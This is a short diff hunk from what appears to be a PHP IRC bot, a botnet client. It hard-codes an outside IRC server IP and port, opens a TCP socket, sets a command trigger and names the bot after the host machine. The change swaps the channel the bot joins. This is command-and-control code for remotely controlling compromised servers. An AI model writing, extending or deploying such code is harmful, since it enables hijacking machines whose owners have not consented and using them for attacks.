@@ -6,7 +6,7 @@ set_time_limit(0);
 
 $ircServer = "176.127.69.56";
 $ircPort = intval("6667");
-$ircChannel = "#" . "theend";
+$ircChannel = "#" . "villager";
 $botTrigger = "+";
 $botName = gethostname();
 $ircSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
